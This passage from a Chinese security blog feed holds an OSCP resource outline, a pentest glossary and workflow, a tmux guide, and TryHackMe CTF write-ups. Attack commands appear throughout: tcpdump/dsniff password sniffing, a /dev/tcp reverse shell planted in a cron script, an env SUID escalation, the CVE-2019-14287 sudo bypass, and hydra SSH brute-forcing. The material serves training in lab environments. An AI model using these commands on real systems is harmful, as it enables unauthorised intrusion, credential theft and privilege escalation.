<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="noopener">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></li>
</ul>
</li>
<li>Attack Tools（攻击工具）<ul>
<li>Responder - <a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></li>
<li>SMBExec - <a href="https://github.com/pentestgeek/smbexec" target="_blank" rel="noopener">https://github.com/pentestgeek/smbexec</a></li>
<li>WCE - <a href="http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/" target="_blank" rel="noopener">http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Post-Exploitation（后渗透阶段）<ul>
<li>Comprehensive Wiki<ul>
<li><a href="http://pwnwiki.io/#!index.md" target="_blank" rel="noopener">http://pwnwiki.io/#!index.md</a></li>
</ul>
</li>
<li>Pivoting（跳板/平移）<ul>
<li>Stealing Hashes（窃取hashes）<ul>
<li>WCE - <a href="http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/" target="_blank" rel="noopener">http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/</a></li>
</ul>
</li>
<li>Password Sniffing（密码嗅探）<ul>
<li>Tcpdump<ul>
<li>tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i ‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ‘ –color=auto –line-</li>
</ul>
</li>
<li>Ngrep<ul>
<li>ngrep -q -W byline “GET|POST HTTP”</li>
</ul>
</li>
<li>Dsniff<ul>
<li>dsniff -m</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Attack Frameworks/Tools（攻击框架/工具）<ul>
<li>Empire<ul>
<li><a href="http://www.powershellempire.com/" target="_blank" rel="noopener">http://www.powershellempire.com/</a></li>
</ul>
</li>
<li>Armitage<ul>
<li><a href="http://blog.cobaltstrike.com/2016/05/25/raffis-abridged-guide-to-cobalt-strike/" target="_blank" rel="noopener">http://blog.cobaltstrike.com/2016/05/25/raffis-abridged-guide-to-cobalt-strike/</a></li>
</ul>
</li>
<li>Privilege Escalation（权限提升）<ul>
<li>PowerSploit - <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></li>
</ul>
</li>
</ul>
</li>
<li>Download Files via Command Line（通过命令行下载文件）<ul>
<li><a href="https://www.greyhathacker.net/?p=500" target="_blank" rel="noopener">https://www.greyhathacker.net/?p=500</a></li>
</ul>
</li>
<li>Information Gathering（信息收集）<ul>
<li>LinEnum - <a href="http://www.rebootuser.com/?p=1758" target="_blank" rel="noopener">http://www.rebootuser.com/?p=1758</a></li>
<li>privilege-escalation-awesome-scripts-suite - <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></li>
</ul>
</li>
</ul>
</li>
<li>Exfiltration（撤出）<ul>
<li>Detection Capabilities（探测能力）<ul>
<li>Egress-Assess<ul>
<li><a href="https://github.com/ChrisTruncer/Egress-Assess" target="_blank" rel="noopener">https://github.com/ChrisTruncer/Egress-Assess</a></li>
</ul>
</li>
<li>Outbound Port Detection (find unfiltered outbound connections)（探测出端口，指找到未被过滤的出口连接）<ul>
<li><a href="http://www.floyd.ch/?p=352" target="_blank" rel="noopener">http://www.floyd.ch/?p=352</a></li>
</ul>
</li>
</ul>
</li>
<li>Network Exfiltration（网络撤出）</li>
</ul>
</li>
<li>Phishing（钓鱼）<ul>
<li>Important: Immediately pivot from initial host（重要：应尽快从最初入侵的主机跳转/平移出去）</li>
<li>Tools（工具们）<ul>
<li>Empire<ul>
<li><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/" target="_blank" rel="noopener">https://enigma0x3.net/2016/03/15/phishing-with-empire/</a></li>
</ul>
</li>
<li>Gophish<ul>
<li><a href="https://github.com/gophish/gophish" target="_blank" rel="noopener">https://github.com/gophish/gophish</a></li>
</ul>
</li>
</ul>
</li>
<li>Initial Access Techniques（建立初始入侵的技术们）<ul>
<li>Office Macros</li>
</ul>
</li>
<li>Tools for Internal Use（内部使用的工具）<ul>
<li>PowerView - stealuserhunter</li>
</ul>
</li>
</ul>
</li>
<li>Misc.（杂项）<ul>
<li>Find Exploits（查找漏洞利用）<ul>
<li>Linux<ul>
<li>Command line<ul>
<li>searchsploit -e Windows 7<ul>
<li>searchsploit windows 2007 | grep -i local</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Web<ul>
<li>Exploit-db<ul>
<li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></li>
</ul>
</li>
<li>Packet Storm<ul>
<li><a href="https://packetstormsecurity.com/files/tags/exploit" target="_blank" rel="noopener">https://packetstormsecurity.com/files/tags/exploit</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Various Automation（各种自动化工具）<ul>
<li><a href="https://github.com/leebaird/discover" target="_blank" rel="noopener">https://github.com/leebaird/discover</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="渗透测试术语"><a href="#渗透测试术语" class="headerlink" title="渗透测试术语"></a>渗透测试术语</h2><ul>
<li>SRC(Security Response Center) 安全应急响应中心</li>
<li>肉鸡 能被控制的实体电脑/服务器</li>
<li>抓鸡 利用自动化方式获取肉鸡的行为</li>
<li>提权 从低权限用户提升到高权限</li>
<li>后门 对主机的长期控制，留下的入口</li>
<li>跳板 使用肉鸡IP来实施攻击其他目标，隐藏自身</li>
<li>旁站入侵 同服务器下的网站入侵，入侵后通过提权目录等手段拿到目标网站的权限</li>
<li>C段入侵 C段内网入侵</li>
<li>黑盒测试 </li>
<li>白盒测试</li>
<li>APT攻击(Advanced Persistent Thread) 高级可持续性攻击</li>
<li>CVE 漏洞编号</li>
<li>CVSS 漏洞评分</li>
<li>CWE 漏洞类型编号</li>
<li>0day 没被公布的漏洞</li>
<li>1day 刚公布的0day，但没有修复</li>
<li>poc 漏洞验证</li>
<li>exp 漏洞利用</li>
<li>payload 攻击载荷</li>
<li>web指纹 banner</li>
</ul>
<h2 id="渗透测试完整测试流程"><a href="#渗透测试完整测试流程" class="headerlink" title="渗透测试完整测试流程"></a>渗透测试完整测试流程</h2><h3 id="渗透测试和入侵的区别"><a href="#渗透测试和入侵的区别" class="headerlink" title="渗透测试和入侵的区别"></a>渗透测试和入侵的区别</h3><ul>
<li>渗透测试：出于保护系统的目的，更全面找出测试对象的安全隐患</li>
<li>入侵：不择手段拿到系统权限</li>
</ul>
<h3 id="简要步骤"><a href="#简要步骤" class="headerlink" title="简要步骤"></a>简要步骤</h3><ol>
<li>明确目标</li>
<li>信息收集</li>
<li>漏洞探测</li>
<li>漏洞验证</li>
<li>信息分析</li>
<li>获取所需</li>
<li>信息整理</li>
<li>形成报告</li>
</ol>
<h3 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h3><p>测试目标的范围,ip,域名,内外网<br>确定规则：能渗透到什么程度，时间，能否修改上传？能否提权？<br>确定需求：web应用的漏洞（新上线的程序？业务逻辑漏洞？人员权限管理漏洞（针对人员，权限？等等，全方位</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>方式：主动扫描/开发搜索（被动扫描<br>开放扫描：已公开的信息，搜索引擎</p>
<p>基础信息：IP 网段，域名，端口<br>系统信息：操作系统版本<br>应用信息：各端口的应用，如web应用，漏洞应用<br>版本信息：应用的版本信息<br>人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。<br>防护信息：试着看能否探测到防护设备（waf，防火墙等</p>
<h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><ol>
<li>ping域名</li>
<li>nslookup</li>
<li>确定对方是否使用CDN<code>(Content Delivery Network)</code>技术<ol>
<li>怎么确定?<ol>
<li>多地ping</li>
<li>nslookup(如果出现多个ip就是)</li>
</ol>
</li>
</ol>
</li>
<li>怎么找到真实IP？<ol>
<li>找解析记录</li>
<li>查询子域名</li>
<li>网站漏洞查找<ol>
<li>网站邮件订阅查找</li>
<li>手机端APP抓包</li>
</ol>
</li>
</ol>
</li>
<li>子域名<ul>
<li>谷歌语法，子域名挖掘机，站长之家，云悉，whois查询</li>
</ul>
</li>
<li>旁站查询<ul>
<li>站长之家等</li>
</ul>
</li>
<li>C段信息收集<ul>
<li>nmap等扫描工具</li>
</ul>
</li>
<li></li>
</ol>
<p>shodan，fofa，zoomeye</p>
<p>cms<br>在线cms指纹识别<br>火狐插件<br>kali自带 whatweb</p>
<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>漏洞扫描 AWVS IBM appscan<br>结合漏洞去exploit-db网址找利用<br>在网上去寻找验证poc</p>
<p>系统漏洞：有没有打补丁？<br>webserver:webserver配置问题<br>web应用漏洞：web应用开发问题<br>其他端口服务漏洞<br>通信安全（信息的明文传输</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>自动化验证：结合自动化扫描工具提供的结果<br>手工验证：根据公开资源进行验证<br>实验验证</p>
<h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><p>精准打击</p>
<h3 id="获取所需"><a href="#获取所需" class="headerlink" title="获取所需"></a>获取所需</h3><p>实施攻击<br>获取内部信息 –基础设施，网络连接，vpn，路由，拓扑<br>进一步渗透 –内网入侵，敏感目标<br>持续性存在 —rookit，后门，添加管理帐号<br>清理痕迹 – 清理相关日志(访问，操作) 上传文件等。</p>
<h3 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h3><p>代码，poc，exp<br>收集信息<br>漏洞信息</p>
<h3 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h3><h3 id="报告编写"><a href="#报告编写" class="headerlink" title="报告编写"></a>报告编写</h3><ol>
<li>封皮</li>
<li>明确重点要求</li>
<li>给谁看？不同职位的人关注的侧重点不一样</li>
<li>内容提要</li>
<li>漏洞列表（最好一页列出来</li>
<li>过程清晰明确</li>
<li>工具（版本和功能</li>
<li>渗透测试团队成员-联系方式</li>
<li>修复建议</li>
</ol>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmux快速指北</title>
    <url>/2020/04/14/Tmux%E5%BF%AB%E9%80%9F%E6%8C%87%E5%8C%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><img src="https://images.atsud0.me/images/post/image-1586696613313.png" alt="file"></p>
<p>Original credit for the cheat sheet goes to <a href="https://linuxacademy.com/blog/linux/tmux-cheat-sheet/" target="_blank" rel="noopener" title="Linux Academy">Linux Academy</a></p>
<p>For another excellent resource on learning tmux, check out IppSec’s video: <a href="https://www.youtube.com/watch?v=Lqehvpe_djs" target="_blank" rel="noopener" title="Link">Link</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>tmux是一款优秀的终端复用软件，他有但不仅有以下功能</p>
<ul>
<li>优秀的分屏功能</li>
<li>使命令行工作存活</li>
<li>会话共享</li>
</ul>
<a id="more"></a>


<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install tmux #Debian系 Kali已预安装</span><br><span class="line">yum install -y tmux  #Centos</span><br><span class="line">pacman -S tmux #Arch</span><br></pre></td></tr></table></figure>

<h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux  #新建一个无名称会话，默认为0</span><br><span class="line">tmux new -s test #新建一个名为test的会话</span><br></pre></td></tr></table></figure>
<h3 id="暂时离开"><a href="#暂时离开" class="headerlink" title="暂时离开"></a>暂时离开</h3><p>快捷键 <code>ctrl+b+d</code><br>或者输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux detach #放置后台运行</span><br></pre></td></tr></table></figure>

<h3 id="恢复会话"><a href="#恢复会话" class="headerlink" title="恢复会话"></a>恢复会话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux a -t [session-name]</span><br></pre></td></tr></table></figure>

<h3 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h3><p>在会话窗口中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exit #退出当前会话</span><br><span class="line">tmux kill-session -t test #关闭test会话</span><br><span class="line">tmux kill-server #关闭所有会话</span><br></pre></td></tr></table></figure>

<h3 id="查看会话"><a href="#查看会话" class="headerlink" title="查看会话"></a>查看会话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux list-session #查看所有会话</span><br><span class="line">tmux ls #查看所有会话</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>使用<a href="https://github.com/gpakosz/.tmux" target="_blank" rel="noopener">gpaskosz</a>的配置文件,方便快捷好用,懒人的首选!</p>
<p>我的配置文件<a href="https://github.com/atsud0/tmux-backupconf" target="_blank" rel="noopener">me</a></p>
<p><a href="http://louiszhai.github.io/2017/09/30/tmux/#%E5%AF%BC%E8%AF%BB" target="_blank" rel="noopener">更多</a></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Agent-sudo</title>
    <url>/2020/04/28/TryHackMe-Agent-sudo/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/agentsudoctf" target="_blank" rel="noopener">agentsudo</a></p>
<p>本文涉及<code>sudo漏洞</code>,<code>ftp密码爆破</code>,<code>zip密码爆破</code>,<code>提取图片隐藏信息</code></p>
<p>靶机难度:简单</p>
<a id="more"></a>
<p>先使用nmap探测端口.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_200508.jpg" alt="nmap"></p>
<p>发现了http服务，但是扫不出任何目录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_200607.jpg" alt="gobudir"></p>
<p>访问后出现以下页面，让我们切换代号User-Agent?<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_200855.jpg" alt="web"></p>
<p>根据最后的署名R，猜测是字母。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_201007.jpg" alt="caice"></p>
<p>最终使用<code>C</code>时成功<br>通过这段话，我们获得了一个用户名字:chris,还有一个信息——该用户使用弱密码。</p>
<p>这个机器上有ftp，和ssh服务。先尝试ftp<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_201353.jpg" alt="ftp"></p>
<p>登录进去后,查看文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_201747.jpg" alt="ftp-file"></p>
<p>查看文件发现一段信息<img src="https://images.atsud0.me/images/post/Screenshot_20200428_201650.jpg" alt="mess"></p>
<p>把图片都下载下来，这里用到了图片隐写术。。</p>
<p><code>binwalk *.jpg</code>分析文件<br><code>binwalk -e *.jpg</code> 自动化提取</p>
<blockquote>
<p>-e选项可以用来执行自动数据提取的基础上提取规则中指定的默认的extract.conf文件</p>
</blockquote>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_201948.jpg" alt="binwalk"></p>
<p>将文件提出出来后会发现以下内容，这里尝试解压后发现还需要密码..<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_202241.jpg" alt="hide"></p>
<p>使用zip2john获得hash值，再使用john爆破<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_203319.jpg" alt="zip-passwd"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_203550.jpg" alt="password"><br>这个密码用base64解密后会得到图片密码。<br>使用图片隐写术的工具取得图片密码</p>
<pre><code>steghide extract -sf cute-alien.jpg</code></pre><p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_204909.jpg" alt="hide"></p>
<p>ssh登录进去，拿到<code>user.flag</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_210928.jpg" alt="user-flag"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看到<code>sudo -l</code>的权限</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_213816.jpg" alt="sudo -l"></p>
<p>上面的命令是能以非root的身份执行/bin/bash</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_211601.jpg" alt="sudo -v"></p>
<p>还好能通过google搜索到<code>exploit</code></p>
<p>这个漏洞影响到1.8.28之前的版本。<br><code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code><br>这使你能够以其他用户身份执行任何命令，但是（理论上）将阻止他们以<code>超级用户/ admin / root</code>用户身份执行命令。 换句话说，您可以假装是任何用户，但管理员除外。</p>
<p>照着上面的说法，我们是不可以用<code>sudo</code>以<code>root</code>的身份执行<code>bash</code>的，<code>sudo</code> 可以用<code>-u</code> 指定用户身份运行。</p>
<p>例如 <code>sudo -u#0 whoami</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_202946.jpg" alt="-u"></p>
<p>但是如果，你指定一个无符号的值<code>-1</code>–429496725 sudo会错误的解读为0，即根用户。<br>但是只有在这种案例上才有用。</p>
<ul>
<li>sudo版本小于1.8.28</li>
<li>错误的配置<code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code></li>
</ul>
<p><a href="https://www.cybersecurity-help.cz/vdb/SB2019101501" target="_blank" rel="noopener">cve-2019-14287</a></p>
<p>拿到root权限。和最终flag。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_212000.jpg" alt="root"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>john</tag>
        <tag>binwalk</tag>
        <tag>cve-2019-14287</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Anonymous</title>
    <url>/2020/06/09/TryHackMe-Anonymous/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/anonymous" title="" target="">Anonymous</a>
<p>难度:十分的简单。</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200609_221816.jpg" alt=""></p>
<p>smb扫描结果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200609_221505.jpg" alt=""></p>
<p>目标开放了smb端口，以及ftp端口。而且smb下似乎是有可读的目录，不过我这里先尝试了匿名登录ftp。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 10.10.95.17</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200609_222233.jpg" alt=""><br>使用匿名用户登录成功，进去之后有一个scripts目录，该目录下面还有一个clean.sh脚本文件。不管3721，先把文件都下载下来。再慢慢查看。</p>
<figure class="highlight shell"><figcaption><span>clean.sh</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo "Running cleanup script:  nothing to delete" &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo "$(date) | Removed file /tmp/$LINE" &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>可以看到这个任务好像是检查tmp目录下面的文件，如果有文件就删除，并且打印内容到<code>removed_files.log</code>下，如果没有文件也打印没有文件删除。那么我们接下来可以查看下log文件查看<code>removed_files.log</code>后发现还有在运行。</p>
<p>那么接下来就好办了，测试下能不能上传文件如果能上传文件的话，那一切都好办了。修改clean.sh在文件其中添加反弹shell的代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_ip&#x2F;your_listen_port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200609_223836.jpg" alt=""><br>结果还真能。。</p>
<p>成功get-shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200609_224203.jpg" alt=""></p>
<p><code>user-flag:********************************</code></p>
<h2 id="提权-amp-漏洞利用"><a href="#提权-amp-漏洞利用" class="headerlink" title="提权&amp;漏洞利用"></a>提权&amp;漏洞利用</h2><p>因为是直接反弹回来的，所以不能直接sudo -l查看有没有权限，需要输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
<p>来开启新的tty，才能输入密码。不过sudo 之后提示需要密码，但是我们没有，所以这条路暂时舍弃。搜索下suid位权限，看看有没有能利用的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200609_225252.jpg" alt=""></p>
<p>找到了一个env，我们可以直接利用它。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">env /bin/sh -p</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200609_225826.jpg" alt=""></p>
<p><code>root-flag:********************************</code></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>FTP</tag>
        <tag>GTFOBins-env</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Basic_Pentesting</title>
    <url>/2020/04/28/TryHackMe-Basic-Pentesting/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/basicpentestingjt" target="_blank" rel="noopener">Basic_Pentesting</a></p>
<p>本文涉及:</p>
<ul>
<li>SSH暴力破解（hydra</li>
<li>信息枚举</li>
<li>hash破解(John</li>
</ul>
<p>靶机难度:十分简单(主要还是爆破密码花点时间)</p>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>常规思路上来先扫一波。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_184244.jpg" alt="nmap"></p>
<p>可以发现目标开启了以下端口:</p>
<ul>
<li>22 ssh</li>
<li>80 http</li>
<li>139 smb</li>
<li>445 smb</li>
<li>8009 ajp13</li>
<li>8080 http</li>
</ul>
<p>发现有http服务开着，用<code>Gobuster</code>探测路径<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_184818.jpg" alt="dir"></p>
<p>可以发现是有一个目录<code>/development</code>,对着目录进行进行扫描。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_185150.jpg" alt="dev"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_185427.jpg" alt="path"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_185451.jpg" alt="web-dev"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_185528.jpg" alt="j"></p>
<p>说了什么看不太懂，大概是给出了提示在smb目录里。</p>
<h1 id="SMB信息枚举"><a href="#SMB信息枚举" class="headerlink" title="SMB信息枚举"></a>SMB信息枚举</h1><p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_185646.jpg" alt="smb"><br>有个匿名目录，可读。</p>
<p>smbclient 登录进去查看该文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_185801.jpg" alt="staff"></p>
<p>从这段信息，可以猜测到smb有两个用户</p>
<ul>
<li>Jan</li>
<li>Kay</li>
</ul>
<hr>
<p>做完这个靶机后，我去看了大佬们的writeup，发现这里其实还有一种思路。<br>使用<code>emun4linux</code>这个工具枚举出了用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.10.36.16</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_190651.jpg" alt="emun4"></p>
<hr>
<h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1><p>接下来就是用<code>hydra</code>爆破ssh密码了（因为房间已经给明提示了…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l jan -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz -t 4 ssh:&#x2F;&#x2F;10.10.36.16</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_193847.jpg" alt="hydra"></p>
<p>爆破出密码,ssh登录进去看看,一进去系统发现没有sudo 权限，jan家目录下只有一个文件，还是不可读的。也没有自动化脚本任务,直接去kay家目录看看</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_194028.jpg" alt="kay"></p>
<p>可以发现.ssh是jan有权限可以进去的，进去把ssh密钥下载到自己的机器上用john爆破<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_194550.jpg" alt="ssh"></p>
<p>登录进去，拿到kay用户的最终密码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200428_194712.jpg" alt="finaly"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用拿到的最终密码，查看到了kay用户是有sudo所有权限的，所有他可以轻易的切换到root用户。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200428_195151.jpg" alt="flag"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这个靶机，让我了解到了使用John爆破密码只能用txt文件。。要不然会报错。<br>以及让我了解到了一个工具叫<code>enum4linux</code>这个工具。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>john</tag>
        <tag>hydra</tag>
        <tag>smb-enum</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Blaster</title>
    <url>/2020/04/26/TryHackMe-Blaster/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/blaster" target="_blank" rel="noopener">Blaster</a></p>
<p>靶机难度:简单</p>
<p>这是靶机<a href="/2020/04/24/TryHackMe-Ice/" title="TryHackMe-Ice">TryHackMe-Ice</a>的后续.</p>
<a id="more"></a>

<p>扫描之后发现,目标主机打开了2个端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -sV -p- -T5 10.10.117.185</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-05 05:46 UTC</span><br><span class="line">Nmap scan report for ip-10-10-117-185.eu-west-1.compute.internal (10.10.117.185)</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80&#x2F;tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">3389&#x2F;tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">MAC Address: 02:C6:A6:1B:9B:4E (Unknown)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.03 seconds</span><br></pre></td></tr></table></figure>

<p>浏览网站后发现是网站运行的是IIS服务.<br>用dirb扫描目录后发现隐藏目录<code>/retro</code></p>
<p>进去访问后,发现是个<code>wordpress</code>博客,通过浏览帖子的方式收集到用户名和密码.<br>使用rdp登录上去,通过查看浏览器历史记录,和回收站记录.发现存在可绕过UAC漏洞.</p>
<p>绕过教程:<br>漏洞复现教程:<a href="https://www.youtube.com/watch?v=3BQKpPNlTSo" target="_blank" rel="noopener">Ytb</a></p>
<div class="video-container"><iframe src="https://www.youtube.com/embed/3BQKpPNlTSo" frameborder="0" loading="lazy" allowfullscreen></iframe></div>

